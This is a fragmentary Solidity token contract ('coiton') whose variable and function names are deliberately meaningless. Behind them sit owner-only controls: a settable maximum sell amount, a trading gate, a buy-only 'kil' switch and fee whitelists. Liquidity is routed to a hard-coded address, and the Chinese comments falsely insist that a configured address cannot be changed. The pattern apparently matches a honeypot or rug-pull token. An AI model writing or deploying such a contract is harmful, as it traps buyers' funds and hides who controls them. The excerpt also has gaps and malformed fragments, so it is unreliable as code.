...
abstract contract AToken is IERC20, Ownable {
    ...
    uint256 public _Jsandi = 100;

    uint256 public _Jsanti = 0;//
    uint256 public _Gcenj = 0;//

    uint256 public _Guiui = 100;

    uint256 public _Gyu = 0;//
    ...
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];//=0xB821bb072f08A338962272923f9f4kjhkjh221B69094FC (配置地址，不能改，改了会产生错误）
    }
    ...
    function jkioukommk(uint256 _kommk) public onlyOwner{
        
        kommk = _kommk;
    
    }

    function o(bool status) public onlyOwner {
        limitEnable = status;
    }
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == goMoonBlock) {
                    require(0 < kil && _swapPairList[to], "!kil");
                }
                ...
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        ...
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _Jsandi + _Jsanti + _Guiui + _Gcenj + _Gyu;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _Guiui + _Gcenj + _Gyu;
                require(tAmount <= kommk,"over max kommk amount");
            } else {
                swapFee = _Jsandi + _Jsanti;
                require(tAmount <= oiui,"over max oiui amount");
            }
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        uint256 fundAmount = usdtBalance * (_Jsandi + _Guiui) * 2 / swapFee;
        ...
        if (lpAmount > 0) {
            ...
            if (lpusdtt > 0) {//=0xB821bb072f08A338962272923f9f4221B69094FC (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpusdtt, 0, 0, address(0x0B2D0A770AD01bc32D0a96BD6cb79e0fd4784F9c), block.timestamp
                );
            }
        }
    }
    ...
    function po() external onlyOwner {
        kil = 0;
    }

    function ui() external onlyOwner {
        require(0 == goMoonBlock, "trading");
        goMoonBlock = block.number;
    }

    function shen8(address addr, bool enable) external onlyFunder {
    ...
    function adseui(address addr, bool enable) external onlyFunder {
        excludeHolder[addr] = enable;
    }
}

contract coiton is AToken {
    constructor() AToken(
        ...
        18,//De
        100000,//Su 
        address(0x0B2D0A770AD01bc32D0a96BD6cb79e0fd4784F9c),//
        address(0x0B2D0A770AD01bc32D0a96BD6cb79e0fd4784F9c)//
    ){
    }
}